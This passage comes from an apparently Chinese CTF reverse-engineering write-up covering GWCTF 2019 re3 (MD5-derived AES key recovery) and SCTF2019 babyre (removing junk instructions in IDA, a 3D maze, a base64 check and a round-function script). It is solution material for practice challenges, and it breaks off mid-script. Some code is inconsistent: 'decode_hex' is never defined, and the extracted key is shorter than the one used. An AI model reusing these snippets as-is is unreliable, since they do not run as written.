2019]re3006"></p><p>加密后的密文为：</p><blockquote><p>BC0AADC0147C5ECCE0B140BC9C51D52B46B2B9434DE5324BAD7FB4B39CDB4B5B</p></blockquote><p>流程：</p><p>用unk_603170作为轮密钥来将我们输入的的flag进行加密，动调可以得到上面加密过后的字符串。</p><p>也就是知道unk_603170的数据，我们就可以逆向解出来flag，而unk_603170的值来自于上面的函数。</p><h3 id="sub-40207B-函数："><a href="#sub-40207B-函数：" class="headerlink" title="sub_40207B()函数："></a>sub_40207B()函数：</h3><p>后来才知道，这当中的sub_401CF9函数其实为<strong>MD5</strong>加密算法（建议学习一下源码，不然以后遇到了又不知道）</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303231014.png" alt="[GWCTF 2019]re3007"></p><p>其实从上面的代码当中我们可以看到，与a1有关的行数就是第10行和第14行，其他的都是没用的混淆，而这个函数的作用就是sub_401CF9()函数将base64表加密两次，然后存到a1，</p><p>这里可以动调得到加密过后的a1，也就是unk_603170的值。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.bss:0000000000603170 unk_603170 db 0CBh                            ; DATA XREF: main+B9↑o</span><br><span class="line">.bss:0000000000603170                                        ; sub_402219+28↑o</span><br><span class="line">.bss:0000000000603171 db   8Dh</span><br><span class="line">.bss:0000000000603172 db   49h ; I</span><br><span class="line">.bss:0000000000603173 db   35h ; 5</span><br><span class="line">.bss:0000000000603174 db   21h ; !</span><br><span class="line">.bss:0000000000603175 db   0B4h</span><br><span class="line">.bss:0000000000603176 db   7Ah ; z</span><br><span class="line">.bss:0000000000603177 db   4Ch ; L</span><br><span class="line">.bss:0000000000603178 db  0C1h</span><br><span class="line">.bss:0000000000603179 db  0AEh</span><br><span class="line">.bss:000000000060317A db  7Eh ; ~</span><br><span class="line">.bss:000000000060317B db  62h ; b</span><br><span class="line">.bss:000000000060317C db  22h ; &quot;</span><br><span class="line">.bss:000000000060317D db  92h</span><br><span class="line">.bss:000000000060317E db  66h ; f</span><br></pre></td></tr></table></figure><p>将最后unk_603170的值提取出来</p><blockquote><p>CB8D493521B47A4CC1AE7E62229266</p></blockquote><p>函数过程如下：</p><ol><li>经过MD5加密得到AES ECB模式的 密钥（可动调提取）</li><li>然后将32位的输入分成两部分，进行AES128加密</li><li>最后与密文进行比较</li></ol><h2 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">aes = AES.new(decode_hex(<span class="string">&#x27;CB8D493521B47A4CC1AE7E62229266CE&#x27;</span>)[<span class="number">0</span>], AES.MODE_ECB)</span><br><span class="line">print(aes.decrypt(decode_hex(<span class="string">&#x27;BC0AADC0147C5ECCE0B140BC9C51D52B46B2B9434DE5324BAD7FB4B39CDB4B5B&#x27;</span>)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><h1 id="SCTF2019-babyre"><a href="#SCTF2019-babyre" class="headerlink" title="[SCTF2019]babyre"></a>[SCTF2019]babyre</h1><h2 id="关键词：花指令"><a href="#关键词：花指令" class="headerlink" title="关键词：花指令"></a>关键词：花指令</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个题我还是放了一段时间才又来做，当初碰到这个题目的时候，被这个花指令劝退了，对，很麻烦的花指令，当时没有去除干净，导致f5反汇编出来的结果有些出入，虽然大体上看得出来这个题目由三部分组成。好了闲话不多说，回到这个题。</p><h2 id="去除花指令"><a href="#去除花指令" class="headerlink" title="去除花指令"></a>去除花指令</h2><h3 id="粗糙的去除花指令"><a href="#粗糙的去除花指令" class="headerlink" title="粗糙的去除花指令"></a>粗糙的去除花指令</h3><p>首先拿到这个题目，在Ubuntu下看看基本信息，shared object是linux 的动态连接库，叫 共享对象：shared object；就相当于windows下面的DLL<img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303231350.png" alt="[SCTF2019]babyre001"></p><p>拖入ida，shift+f12查看字符串，双击字符串按 “X”键 查看交叉引用来到main函数</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303231425.png" alt="[SCTF2019]babyre002"></p><p>由红色字体就可以看出来，代码没有正确反编译，加了花指令，我们需要将下面3处 方框当中的三条矛盾的指令nop掉（Edit—&gt;Patch Program—&gt;Assemble）。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303231447.png" alt="[SCTF2019]babyre003"></p><p>nop过后：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303231745.png" alt="[SCTF2019]babyre004"></p><p>用同样的方法将下面几条也改了。</p><p><img src="C:\Users\thh\Pictures\ctf\BUUCTF[SCTF2019]babyre[SCTF2019]babyre006.png" alt="[SCTF2019]babyre006"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303231733.png" alt="[SCTF2019]babyre005"></p><p>再将下面这两个jb jnb nop掉，再将E4机器码修改为90。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303231729.png" alt="[SCTF2019]babyre007"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303231952.png" alt="[SCTF2019]babyre008"></p><p>下面这些地方是我当初没注意到的，这直接导致我当时的反汇编代码有出入，当然这些也是这道题可以学到的地方：</p><p>1、main函数当中有一条call loc_C22 指令，但是loc_C22根本不是函数，需要按 “Y键” 将修改类型。将其改为一个独立的函数。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303231948.png" alt="[SCTF2019]babyre009"></p><p>2、然后将test还原为数据，(键盘‘d’键)，</p><p>最后按P将函数重构得到反汇编代码如下：</p><p>其实吧，</p><p>上面去除花指令的方法普遍是网上那些文章所使用的，这虽然成功的去除了花指令，但是这样的去除手段显得过于粗糙（话句话说，可能就是碰巧去除了）。</p><p>下面来说说精确的去除花指令的方法。</p><h3 id="正确的去除花指令"><a href="#正确的去除花指令" class="headerlink" title="正确的去除花指令"></a>正确的去除花指令</h3><p>首先我们需要知道，IDA是线性反编译，他会把代码段中所有的数据当成代码来看，但是花指令（就是没用的垃圾代码）就会造成IDA也会认为垃圾数据也是代码 从而导致整个反编译错误。</p><p>下面我们来好好分析分析这个程序，精确的去除花指令。</p><p>重新把这个程序载入ida，来到目标代码区域：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303231944.png" alt="[SCTF2019]babyre0011"></p><p>从上面这张图片我们可以看到，地址 98B 和地址 98D 跳转到 loc_98F+1 也就是地址 990 处，但是并没有 990 这个地址，红色提示说明这里就是有问题的（基本上就是加了花）。</p><p>所以我们需要把鼠标光标移到98F按 “D键” 将这段区域转化为数据（data），如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303231940.png" alt="[SCTF2019]babyre0012"></p><p>我们简单将地址 98F 的字节码 E1 给patch了（修改为90）即可（Edit—&gt;Patch Program—&gt;Change byte），然后选中我们修改成90的地址和原本代码地址一起，按 “C键” 将其恢复成代码（code）：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303231937.png" alt="[SCTF2019]babyre0013"></p><p>用同样的方法将下面几条花指令也修改了。</p><p>如此修改，不会向上面粗糙的改法一样，显得突兀。</p><p>现在来说说上面粗糙去除花指令的错误之处。</p><p>1、首先jb loc_89F+1 和 jnb loc_89F+1并不是矛盾代码。它们表示的意思是，无论如何，程序都会执行 loc_89F+1，我们不能稀里糊涂就将其nop了，因为万一这两条代码下面还有其他操作，我们将其nop了，那么程序就会顺利的执行下面的代码，这里nop了也能反编译出来是因为，下面恰好是我们跳转的目的地址。</p><p>2、将指令 in     al， 0C7h的第一位机器码E4修改为90显得过于突兀，为什么会这样改，如何发现的这个地方，为什么不像上面前三组一样，直接将包含jb jnb再内的那三条指令都nop掉。</p><h2 id="逆向解题"><a href="#逆向解题" class="headerlink" title="逆向解题"></a>逆向解题</h2><p>将花指令去除，loc_C22修改为独立的函数过后，我们f5就可以得到反汇编代码了</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Fh] [rbp-151h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+10h] [rbp-150h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+14h] [rbp-14Ch]</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// [rsp+18h] [rbp-148h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+26h] [rbp-13Ah]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+30h] [rbp-130h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+40h] [rbp-120h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+50h] [rbp-110h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+58h] [rbp-108h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+68h] [rbp-F8h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+70h] [rbp-F0h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+78h] [rbp-E8h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+80h] [rbp-E0h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+88h] [rbp-D8h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+90h] [rbp-D0h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+98h] [rbp-C8h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+A0h] [rbp-C0h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+A8h] [rbp-B8h]</span></span><br><span class="line">  __int64 v24; <span class="comment">// [rsp+B0h] [rbp-B0h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+B8h] [rbp-A8h]</span></span><br><span class="line">  __int16 v26; <span class="comment">// [rsp+C0h] [rbp-A0h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+D0h] [rbp-90h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+E0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v29; <span class="comment">// [rsp+158h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v29 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0LL</span>;</span><br><span class="line">  v17 = <span class="number">0LL</span>;</span><br><span class="line">  v18 = <span class="number">0LL</span>;</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  v21 = <span class="number">0LL</span>;</span><br><span class="line">  v22 = <span class="number">0LL</span>;</span><br><span class="line">  v23 = <span class="number">0LL</span>;</span><br><span class="line">  v24 = <span class="number">0LL</span>;</span><br><span class="line">  v25 = <span class="number">0LL</span>;</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(</span><br><span class="line">    (<span class="keyword">char</span> *)&amp;v27,</span><br><span class="line">    <span class="string">&quot;**************.****.**s..*..******.****.***********..***..**..#*..***..***.********************.**..*******..**...*..*.*.**.*&quot;</span>);</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v7 = (<span class="keyword">char</span> *)&amp;v28 + <span class="number">6</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v8, <span class="string">&quot;sctf_9102&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;plz tell me the shortest password1:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v20);</span><br><span class="line">  v6 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *((_BYTE *)&amp;v20 + v5);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        v7 -= <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        v7 += <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        ++v7;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        --v7;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">        v7 += <span class="number">25</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        v7 -= <span class="number">25</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v5;</span><br><span class="line">    <span class="keyword">if</span> ( *v7 != <span class="string">&#x27;.&#x27;</span> &amp;&amp; *v7 != <span class="string">&#x27;#&#x27;</span> )</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v7 == <span class="string">&#x27;#&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;good!you find the right way!\nBut there is another challenge!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;plz tell me the password2:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v12);</span><br><span class="line">    sub_C22();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_F67(&amp;v16, &amp;v8) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Now,this is the last!&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;plz tell me the password3:&quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v9);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_FFA(&amp;v9) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!Here is your flag!:&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sctf&#123;%s-%s(%s)&#125;&quot;</span>, &amp;v20, &amp;v12, &amp;v9);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;something srong...&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;sorry,somthing wrong...&quot;</span>);</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sorry,is&#x27;t not a right way...&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，整个流程有三个验证，flag与我们输入的三步验证有关。</p><h3 id="第一部分：迷宫"><a href="#第一部分：迷宫" class="headerlink" title="第一部分：迷宫"></a>第一部分：迷宫</h3><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303233215.png" alt="[SCTF2019]babyre0014"></p><p>第一部分是一个三维迷宫：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303233204.png" alt="[SCTF2019]babyre0015"></p><p>w控制上、s控制下、a控制左、d控制右、x控制去上一层，y控制去下一层。</p><p>*是墙，.是路径，#是终点,s是起点。</p><blockquote><p>input1：ddwwxxssxaxwwaasasyywwdd</p></blockquote><h3 id="第二部分：base64"><a href="#第二部分：base64" class="headerlink" title="第二部分：base64"></a>第二部分：base64</h3><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303233200.png" alt="[SCTF2019]babyre0016"></p><p>去到函数sub_C22，这里看到有 ==64 &lt;&lt;6 if(v8 == 3) 我们可以判断为base64解码（但是不确定是否换表了）</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303233156.png" alt="[SCTF2019]babyre0017"></p><p>input2字符串经过base64解密过后与字符串 “sctf_9102” 作比较。</p><p>我们将sctf_9102base64加密一下得到最终的input2：c2N0Zl85MTAy</p><h3 id="第三部分：逆向算法"><a href="#第三部分：逆向算法" class="headerlink" title="第三部分：逆向算法"></a>第三部分：逆向算法</h3><p>我们input3的字符串能满足sub_FFA()返回值为1。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303233153.png" alt="[SCTF2019]babyre0018"></p><p>查看函数sub_FFA()</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303233149.png" alt="[SCTF2019]babyre0019"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303233145.png" alt="[SCTF2019]babyre0020"></p><p>查看sub_1464</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303233142.png" alt="[SCTF2019]babyre0021"></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i  = [<span class="number">0xd8bf92ef</span>,<span class="number">0x9fcc401f</span>,<span class="number">0xc5af7647</span>,<span class="number">0xbe040680</span>]</span><br><span class="line">asc = [<span class="number">0xD6</span>,<span class="number">0x90</span>,<span class="number">0xE9</span>,<span class="number">0xFE</span>,<span class="number">0xCC</span>,<span class="number">0xE1</span>,<span class="number">0x3D</span>,<span class="number">0xB7</span>,<span class="number">0x16</span>,<span class="number">0xB6</span>,<span class="number">0x14</span>,<span class="number">0xC2</span>,<span class="number">0x28</span>,<span class="number">0xFB</span>,<span class="number">0x2C</span>,<span class="number">0x05</span>,<span class="number">0x2B</span>,<span class="number">0x67</span>,<span class="number">0x9A</span>,<span class="number">0x76</span>,<span class="number">0x2A</span>,<span class="number">0xBE</span>,<span class="number">0x04</span>,<span class="number">0xC3</span>,<span class="number">0xAA</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,<span class="number">0x06</span>,<span class="number">0x99</span>,<span class="number">0x9C</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xF4</span>,<span class="number">0x91</span>,<span class="number">0xEF</span>,<span class="number">0x98</span>,<span class="number">0x7A</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0B</span>,<span class="number">0x43</span>,<span class="number">0xED</span>,<span class="number">0xCF</span>,<span class="number">0xAC</span>,<span class="number">0x62</span>,<span class="number">0xE4</span>,<span class="number">0xB3</span>,<span class="number">0x1C</span>,<span class="number">0xA9</span>,<span class="number">0xC9</span>,<span class="number">0x08</span>,<span class="number">0xE8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xDF</span>,<span class="number">0x94</span>,<span class="number">0xFA</span>,<span class="number">0x75</span>,<span class="number">0x8F</span>,<span class="number">0x3F</span>,<span class="number">0xA6</span>,<span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xA7</span>,<span class="number">0xFC</span>,<span class="number">0xF3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xBA</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3C</span>,<span class="number">0x19</span>,<span class="number">0xE6</span>,<span class="number">0x85</span>,<span class="number">0x4F</span>,<span class="number">0xA8</span>,<span class="number">0x68</span>,<span class="number">0x6B</span>,<span class="number">0x81</span>,<span class="number">0xB2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xDA</span>,<span class="number">0x8B</span>,<span class="number">0xF8</span>,<span class="number">0xEB</span>,<span class="number">0x0F</span>,<span class="number">0x4B</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9D</span>,<span class="number">0x35</span>,<span class="number">0x1E</span>,<span class="number">0x24</span>,<span class="number">0x0E</span>,<span class="number">0x5E</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xD1</span>,<span class="number">0xA2</span>,<span class="number">0x25</span>,<span class="number">0x22</span>,<span class="number">0x7C</span>,<span class="number">0x3B</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,<span class="number">0xD4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9F</span>,<span class="number">0xD3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,<span class="number">0x4C</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xE7</span>,<span class="number">0xA0</span>,<span class="number">0xC4</span>,<span class="number">0xC8</span>,<span class="number">0x9E</span>,<span class="number">0xEA</span>,<span class="number">0xBF</span>,<span class="number">0x8A</span>,<span class="number">0xD2</span>,<span class="number">0x40</span>,<span class="number">0xC7</span>,<span class="number">0x38</span>,<span class="number">0xB5</span>,<span class="number">0xA3</span>,<span class="number">0xF7</span>,<span class="number">0xF2</span>,<span class="number">0xCE</span>,<span class="number">0xF9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xA1</span>,<span class="number">0xE0</span>,<span class="number">0xAE</span>,<span class="number">0x5D</span>,<span class="number">0xA4</span>,<span class="number">0x9B</span>,<span class="number">0x34</span>,<span class="number">0x1A</span>,<span class="number">0x55</span>,<span class="number">0xAD</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xF5</span>,<span class="number">0x8C</span>,<span class="number">0xB1</span>,<span class="number">0xE3</span>,<span class="number">0x1D</span>,<span class="number">0xF6</span>,<span class="number">0xE2</span>,<span class="number">0x2E</span>,<span class="number">0x82</span>,<span class="number">0x66</span>,<span class="number">0xCA</span>,<span class="number">0x60</span>,<span class="number">0xC0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xAB</span>,<span class="number">0x0D</span>,<span class="number">0x53</span>,<span class="number">0x4E</span>,<span class="number">0x6F</span>,<span class="number">0xD5</span>,<span class="number">0xDB</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,<span class="number">0xDE</span>,<span class="number">0xFD</span>,<span class="number">0x8E</span>,<span class="number">0x2F</span>,<span class="number">0x03</span>,<span class="number">0xFF</span>,<span class="number">0x6A</span>,<span class="number">0x72</span>,<span class="number">0x6D</span>,<span class="number">0x6C</span>,<span class="number">0x5B</span>,<span class="number">0x51</span>,<span class="number">0x8D</span>,<span class="number">0x1B</span>,<span class="number">0xAF</span>,<span class="number">0x92</span>,<span class="number">0xBB</span>,<span class="number">0xDD</span>,<span class="number">0xBC</span>,<span class="number">0x7F</span>,<span class="number">0x11</span>,<span class="number">0xD9</span>,<span class="number">0x5C</span>,<span class="number">0x41</span>,<span class="number">0x1F</span>,<span class="number">0x10</span>,<span class="number">0x5A</span>,<span class="number">0xD8</span>,<span class="number">0x0A</span>,<span class="number">0xC1</span>,<span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xA5</span>,<span class="number">0xCD</span>,<span class="number">0x7B</span>,<span class="number">0xBD</span>,<span class="number">0x2D</span>,<span class="number">0x74</span>,<span class="number">0xD0</span>,<span class="number">0x12</span>,<span class="number">0xB8</span>,<span class="number">0xE5</span>,<span class="number">0xB4</span>,<span class="number">0xB0</span>,<span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4A</span>,<span class="number">0x0C</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7E</span>,<span class="number">0x65</span>,<span class="number">0xB9</span>,<span class="number">0xF1</span>,<span class="number">0x09</span>,<span class="number">0xC5</span>,<span class="number">0x6E</span>,<span class="number">0xC6</span>,<span class="number">0x84</span>,<span class="number">0x18</span>,<span class="number">0xF0</span>,<span class="number">0x7D</span>,<span class="number">0xEC</span>,<span class="number">0x3A</span>,<span class="number">0xDC</span>,<span class="number">0x4D</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xEE</span>,<span class="number">0x5F</span>,<span class="number">0x3E</span>,<span class="number">0xD7</span>,<span class="number">0xCB</span>,<span class="number">0x39</span>,<span class="number">0x48</span>,<span class="number">0xC6</span>,<span class="number">0xBA</span>,<span class="number">0xB1</span>,<span class="number">0xA3</span>,<span class="number">0x50</span>,<span class="number">0x33</span>,<span class="number">0xAA</span>,<span class="number">0x56</span>,<span class="number">0x97</span>,<span class="number">0x91</span>,<span class="number">0x7D</span>,<span class="number">0x67</span>,<span class="number">0xDC</span>,<span class="number">0x22</span>,<span class="number">0x70</span>,<span class="number">0xB2</span>]</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xors</span>(<span class="params">xor_mix</span>):</span></span><br><span class="line">    temp1 = (xor_mix &gt;&gt; <span class="number">24</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    temp2 = (xor_mix &gt;&gt; <span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    temp3 = (xor_mix &gt;&gt; <span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    temp = (xor_mix)&amp;<span class="number">0xff</span></span><br><span class="line"> </span><br><span class="line">    temp_q = asc[temp] | (asc[temp1]&lt;&lt;<span class="number">24</span>)|(asc[temp2]&lt;&lt;<span class="number">16</span>)|(asc[temp3]&lt;&lt;<span class="number">8</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;%x&quot;</span>%(temp_q))</span><br><span class="line">    temp_i = ((temp_q &lt;&lt;<span class="number">12</span>|temp_q&gt;&gt;<span class="number">20</span>)&amp;<span class="number">0xffffffff</span>) ^ ((temp_q &lt;&lt;<span class="number">8</span>|temp_q&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xffffffff</span>) ^ ((temp_q&gt;&gt;<span class="number">2</span>|temp_q&lt;&lt;<span class="number">30</span>)&amp;<span class="number">0xffffffff</span>)^((temp_q&gt;&gt;<span class="number">6</span>|temp_q&lt;&lt;<span class="number">26</span>)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> temp_i</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;%x&quot;</span>%(xors(<span class="number">0x6011F432</span>)))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(asc))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    i.append(i[q]^xors(i[q+<span class="number">1</span>]^i[q+<span class="number">2</span>]^i[q+<span class="number">3</span>]))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (i)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;%x&quot;</span>%(i[-<span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;%x&quot;</span>%(i[-<span class="number">2</span>]))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;%x&quot;</span>%(i[-<span class="number">3</span>]))</span><br><span class="line"><span class="built_in">print</span> (<span 